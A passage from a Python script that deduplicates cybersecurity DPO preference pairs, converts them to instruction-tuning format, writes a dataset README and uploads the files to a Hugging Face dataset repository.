    key = p["prompt"].strip().lower()
    if key not in seen:
        seen.add(key)
        unique_dpo.append(p)

# Convert to SFT format
sft_pairs = [{"instruction": p["prompt"], "input": "", "output": p["chosen"]} for p in unique_dpo]

print(f"\nTotal unique DPO pairs: {len(unique_dpo)}")
print(f"Total SFT pairs: {len(sft_pairs)}")
print(f"  - Synthetic: {len(synthetic_dpo)}")
print(f"  - From backups: {len(unique_dpo) - len(synthetic_dpo)}")

# Write files
output_dir = "/tmp/kin-data-v2"
os.makedirs(output_dir, exist_ok=True)

with open(f"{output_dir}/dpo.jsonl", "w") as f:
    for p in unique_dpo:
        f.write(json.dumps(p) + "\n")

with open(f"{output_dir}/train.jsonl", "w") as f:
    for p in unique_dpo:
        f.write(json.dumps(p) + "\n")

with open(f"{output_dir}/sft.jsonl", "w") as f:
    for p in sft_pairs:
        f.write(json.dumps(p) + "\n")

# Updated README
readme = f"""---
license: apache-2.0
language:
  - en
tags:
  - cybersecurity
  - dpo
  - vulnerability
  - security
  - zero-hallucination
  - CVE
  - MITRE-ATTACK
  - OWASP
size_categories:
  - 1K<n<10K
---

# KIN Cybersecurity DPO Dataset v2

Preference-optimized cybersecurity training data for zero-hallucination vulnerability analysis.

## Stats
- DPO pairs: {len(unique_dpo)}
- SFT pairs: {len(sft_pairs)}
- Sources: Curated cybersecurity DPO pairs, {len(CVES)} real CVE analyses, {len(MITRE)} MITRE ATT&CK techniques, {len(CONCEPTS)} security concepts

## Format

### dpo.jsonl / train.jsonl
DPO format: {{prompt, chosen, rejected}}
- Chosen: precise, structured analysis with CWE/ATT&CK IDs, code examples, specific mitigations
- Rejected: vague, hedging responses (anti-pattern)

### sft.jsonl
Instruction format: {{instruction, input, output}}
"""

with open(f"{output_dir}/README.md", "w") as f:
    f.write(readme)

# Upload
print("\nUploading to nyxspecter4/kin-cyber-dpo-v2...")
try:
    api.upload_folder(
        folder_path=output_dir,
        repo_id="nyxspecter4/kin-cyber-dpo-v2",
        repo_type="dataset",
        token=TOKEN,
        commit_message=f"Expand v2: {len(unique_dpo)} DPO pairs + {len(sft_pairs)} SFT pairs ({len(CVES)} CVEs + {len(MITRE)} MITRE + {len(CONCEPTS)} concepts)"
    )
    print(f"Uploaded successfully!")
except Exception as e:
    print(f"Upload error: {e}")

print(f"\n=== Done: {len(unique_dpo)} DPO + {len(sft_pairs)} SFT ===")
